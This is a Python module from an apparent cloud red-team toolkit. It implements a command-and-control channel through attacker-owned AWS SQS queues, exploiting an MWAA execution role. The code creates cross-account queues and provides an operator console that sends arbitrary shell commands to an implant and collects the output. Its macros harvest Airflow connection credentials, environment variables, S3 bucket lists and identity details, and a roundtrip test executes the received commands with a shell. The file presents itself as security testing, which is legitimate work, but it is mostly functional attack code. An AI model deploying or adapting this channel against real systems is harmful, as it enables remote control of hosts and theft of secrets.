"""
Module 2: Command and Control (C2) Channel Testing

Tests the ability to establish a bidirectional C2 channel through SQS,
exploiting both sqs:SendMessage and sqs:ReceiveMessage permissions in
the MWAA execution role.

Components:
  - setup:    Creates the two attacker-side queues (commands + results)
  - operator: Interactive operator console to send commands and view results
  - send-cmd: Send a single command to the implant
  - recv:     Poll for results from the implant
  - cleanup:  Remove the attacker-side queues
"""

import base64
import json
import shlex
import time
from typing import Optional

from ..config import (
    AttackerConfig,
    DEFAULT_C2_CMD_QUEUE,
    DEFAULT_C2_RESULTS_QUEUE,
)
from ..utils import (
    get_sqs_client,
    create_test_queue,
    set_queue_policy_allow_cross_account,
    delete_test_queue,
    receive_messages,
    send_message,
    print_section,
    print_success,
    print_fail,
    print_info,
    print_warn,
    print_result,
    logger,
)


def setup_c2_infra(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> dict:
    """Create both C2 queues (commands inbound, results outbound)."""
    print_section("C2 Infrastructure Setup")
    sqs = get_sqs_client(attacker.region, attacker.profile)

    # Create command queue
    cmd_url = create_test_queue(sqs, cmd_queue)
    cmd_attrs = sqs.get_queue_attributes(QueueUrl=cmd_url, AttributeNames=["QueueArn"])
    cmd_arn = cmd_attrs["Attributes"]["QueueArn"]
    set_queue_policy_allow_cross_account(sqs, cmd_url, cmd_arn)

    # Create results queue
    results_url = create_test_queue(sqs, results_queue)
    results_attrs = sqs.get_queue_attributes(QueueUrl=results_url, AttributeNames=["QueueArn"])
    results_arn = results_attrs["Attributes"]["QueueArn"]
    set_queue_policy_allow_cross_account(sqs, results_url, results_arn)

    print_success("C2 infrastructure ready:")
    print_result("Command queue", cmd_url)
    print_result("Results queue", results_url)
    print_info("Deploy the C2 implant DAG to the target MWAA environment.")
    print_info("Then use 'operator' mode to interact with the implant.")

    return {
        "command_queue_url": cmd_url,
        "results_queue_url": results_url,
        "command_queue_arn": cmd_arn,
        "results_queue_arn": results_arn,
    }


def send_command(
    attacker: AttackerConfig,
    command: str,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
) -> str:
    """Send a command to the C2 command queue for the implant to execute."""
    sqs = get_sqs_client(attacker.region, attacker.profile)
    cmd_url = attacker.queue_url(cmd_queue)

    response = send_message(sqs, cmd_url, command)
    msg_id = response["MessageId"]
    logger.debug("Command sent (MessageId: %s): %s", msg_id, command)
    return msg_id


def receive_results(
    attacker: AttackerConfig,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
    wait_seconds: int = 10,
    max_results: int = 10,
) -> list:
    """Poll the results queue for implant output."""
    sqs = get_sqs_client(attacker.region, attacker.profile)
    results_url = attacker.queue_url(results_queue)

    messages = receive_messages(
        sqs, results_url,
        max_messages=max_results,
        wait_seconds=wait_seconds,
        delete_after=True,
    )

    decoded = []
    for msg in messages:
        try:
            body = json.loads(msg["Body"])
            result = {
                "command": body.get("command", "unknown"),
                "return_code": body.get("return_code", -1),
                "stdout": base64.b64decode(body.get("stdout", "")).decode("utf-8", errors="replace"),
                "stderr": base64.b64decode(body.get("stderr", "")).decode("utf-8", errors="replace"),
            }
        except (json.JSONDecodeError, KeyError):
            result = {"raw": msg["Body"]}
        decoded.append(result)

    return decoded


def _display_result(result: dict) -> None:
    """Format and display a C2 result."""
    if "raw" in result:
        print(f"  Raw response: {result['raw']}")
        return

    cmd = result.get("command", "?")
    rc = result.get("return_code", -1)
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")

    print(f"\n  --- Result for: {cmd} (rc={rc}) ---")
    if stdout:
        for line in stdout.splitlines():
            print(f"  | {line}")
    if stderr:
        print(f"  [stderr]:")
        for line in stderr.splitlines():
            print(f"  ! {line}")
    print(f"  --- End ---\n")


def operator_console(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> None:
    """
    Interactive operator console for the C2 channel.

    Provides a command prompt to send commands to the implant and
    automatically polls for results.
    """
    print_section("C2 Operator Console")
    print_info(f"Command queue:  {attacker.queue_url(cmd_queue)}")
    print_info(f"Results queue:  {attacker.queue_url(results_queue)}")
    print()
    print("  Commands:")
    print("    <any shell command>  - Send to implant for execution")
    print("    !results             - Poll for pending results")
    print("    !airflow-conns       - Retrieve Airflow connections via implant")
    print("    !env                 - Dump environment variables via implant")
    print("    !s3-list             - List accessible S3 buckets via implant")
    print("    !iam-whoami          - Get caller identity via implant")
    print("    !quit                - Exit the operator console")
    print()

    # Built-in compound commands
    MACROS = {
        "!airflow-conns": "python3 -c \"from airflow.models import Connection; from airflow.utils.session import create_session; "
                          "ses=create_session().__enter__(); [print(f'{c.conn_id}: {c.get_uri()}') for c in ses.query(Connection).all()]\"",
        "!env": "env | sort",
        "!s3-list": "python3 -c \"import boto3; s3=boto3.client('s3'); [print(b['Name']) for b in s3.list_buckets().get('Buckets',[])]\"",
        "!iam-whoami": "python3 -c \"import boto3,json; print(json.dumps(boto3.client('sts').get_caller_identity(), indent=2, default=str))\"",
    }

    while True:
        try:
            user_input = input("  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n")
            print_info("Exiting operator console.")
            break

        if not user_input:
            continue

        if user_input == "!quit":
            print_info("Exiting operator console.")
            break

        if user_input == "!results":
            print_info("Polling for results...")
            results = receive_results(attacker, results_queue, wait_seconds=5)
            if results:
                for r in results:
                    _display_result(r)
            else:
                print_info("No results available.")
            continue

        # Resolve macros
        actual_command = MACROS.get(user_input, user_input)

        print_info(f"Sending command: {actual_command[:80]}{'...' if len(actual_command) > 80 else ''}")
        msg_id = send_command(attacker, actual_command, cmd_queue)
        print_success(f"Command queued (MessageId: {msg_id})")

        # Auto-poll for results after a brief delay
        print_info("Waiting for results...")
        time.sleep(2)
        results = receive_results(attacker, results_queue, wait_seconds=15)
        if results:
            for r in results:
                _display_result(r)
        else:
            print_info("No results yet. The implant may not have polled. Try '!results' later.")


def test_c2_roundtrip(
    attacker: AttackerConfig,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> bool:
    """
    End-to-end C2 channel test without deploying to MWAA.

    Simulates both the operator and implant sides locally to validate
    that the SQS cross-account communication works.
    """
    print_section("C2 Roundtrip Test")

    # Operator side: send a command
    print_info("Operator: Sending test command...")
    msg_id = send_command(attacker, "echo C2_TEST_OK", cmd_queue)
    print_success(f"Command sent (MessageId: {msg_id})")

    # Simulate implant side: receive command, execute, send result
    print_info("Simulating implant: Receiving command...")
    implant_sqs = get_sqs_client(
        source_region or attacker.region,
        source_profile,
    )
    cmd_url = attacker.queue_url(cmd_queue)
    results_url = attacker.queue_url(results_queue)

    messages = receive_messages(implant_sqs, cmd_url, max_messages=1, wait_seconds=10, delete_after=True)
    if not messages:
        print_fail("Implant: No command received. Cross-account ReceiveMessage may be blocked.")
        return False

    command = messages[0]["Body"]
    print_success(f"Implant: Received command: {command}")

    # Execute locally
    import subprocess
    try:
        proc = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        stdout = proc.stdout
        stderr = proc.stderr
        rc = proc.returncode
    except Exception as e:
        stdout = ""
        stderr = str(e)
        rc = -1

    result_payload = {
        "command": command,
        "return_code": rc,
        "stdout": base64.b64encode(stdout.encode()).decode(),
        "stderr": base64.b64encode(stderr.encode()).decode(),
    }

    print_info("Implant: Sending results back...")
    send_message(implant_sqs, results_url, json.dumps(result_payload))
    print_success("Implant: Results sent.")

    # Operator side: receive results
    print_info("Operator: Polling for results...")
    results = receive_results(attacker, results_queue, wait_seconds=10)
    if results and results[0].get("stdout", "").strip() == "C2_TEST_OK":
        print_success("FINDING: Full C2 roundtrip succeeded!")
        print_warn("Bidirectional SQS C2 channel is viable through the MWAA execution role.")
        _display_result(results[0])
        return True
    elif results:
        print_warn("Roundtrip completed but output was unexpected:")
        _display_result(results[0])
        return True
    else:
        print_fail("No results received. C2 channel may not be functional.")
        return False


def cleanup(
    attacker: AttackerConfig,
    cmd_queue: str = DEFAULT_C2_CMD_QUEUE,
    results_queue: str = DEFAULT_C2_RESULTS_QUEUE,
) -> None:
    """Remove the C2 queues."""
    print_section("C2 Cleanup")
    sqs = get_sqs_client(attacker.region, attacker.profile)
    for qname in [cmd_queue, results_queue]:
        try:
            delete_test_queue(sqs, attacker.queue_url(qname))
            print_success(f"Deleted: {qname}")
        except Exception as e:
            print_fail(f"Failed to delete {qname}: {e}")
